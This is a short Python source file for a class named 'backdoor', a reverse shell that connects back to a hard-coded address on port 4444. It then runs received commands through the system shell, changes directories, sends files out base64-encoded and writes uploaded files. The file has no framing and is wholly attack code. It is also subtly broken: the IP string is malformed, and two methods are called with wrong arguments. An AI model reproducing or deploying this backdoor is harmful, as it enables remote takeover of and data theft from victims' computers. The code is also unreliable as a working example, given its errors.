import socket
import subprocess
import json
import os
import base64

class backdoor:

    def __init__(self,ip,port):
        self.connection= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        self.connection.connect(("192,168,43.225",4444))  # ip and port no

        self.connection.send("\n connection established \n")

    def execute_system_command(self,command):

        return subprocess.check_output(command,shell=True)
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
    def reliable_recieve(self):
        json_data=""
        while True:
            try:
                json_data=json_data+ self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def change_working_directory_to(self,path):
        os.chdir(path)
        return "changing working directory to " +path
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "download successful"
    def run(self):
        while True:
            command =self.reliable_recieve(1024)
            if command[0]=="exit":
                self.connection.close()
                exit()
            elif command[0]=="cd" and len(command)>=2:
                command_result= self.change_working_directory_to(command[1])
            elif command[0]=="download":
                command_result= self.read_file(command[1])
            else:
                command_result = self.execute_system_command(self,command)
            self.reliable_send(command_result)


